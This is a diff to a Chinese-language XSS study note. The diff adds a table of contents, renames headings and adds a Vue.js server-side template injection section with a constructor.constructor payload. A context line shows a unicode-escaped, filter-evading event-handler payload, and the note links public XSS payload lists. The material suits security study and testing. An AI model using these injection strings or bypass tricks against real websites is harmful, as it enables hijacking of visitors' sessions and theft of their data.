@@ -7,8 +7,16 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
   
 3. DOM xss:   
 注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  
+  
+*  [XSS detection](#XSS-detection)  
+*  [常見限制 and 對抗手勢](#常見限制and對抗手勢)  
+*  [正規表達式](#正規表達式)  
+*  [攻擊手勢](#攻擊手勢)  
+*  [Cheatsheet](#Cheatsheet)  
+*  [Vue.js](#Vuejs-serverside-template-xss)  
+*  [Reference](#Reference)
 
-## XSS Vulnerability exists?
+## XSS detection
 這裡先不談XSS探針...  
 我習慣直接注入sciprt語句作測試，常見語句如下:  
 ```js
@@ -19,7 +27,7 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
 1. 網頁不存在可利用的xss漏洞，可能注入點直接將值插入網頁作為內容  
 2. 惡意代碼被過濾掉，或者轉譯了 -> 這種情況下就要分析有沒有代替字元來繞過過濾名單，或者繞過轉譯！
 
-## 常見限制 < 對抗手勢
+## 常見限制and對抗手勢
 * 大小寫混用  
 * toUpperCase()  
 ```js
@@ -126,7 +134,14 @@ js中會用正規表達式來過濾危險字符
 "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
 ```
 上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
-[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)
+[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
+
+## Vuejs serverside template xss
+```{{ your code run here! }}```  
+```js
+{{ constructor.constructor("alert('xss')")() }}
+```
+[Here is detail!](https://github.com/dotboris/vuejs-serverside-template-xss)
 
 ## Reference
 1. The Web Application Hacker's Handbook  
@@ -135,4 +150,5 @@ js中會用正規表達式來過濾危險字符
 4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
 5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
 6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
-7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
+7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
+8. [Github: Vue.js serverside template xss demo](https://github.com/dotboris/vuejs-serverside-template-xss)
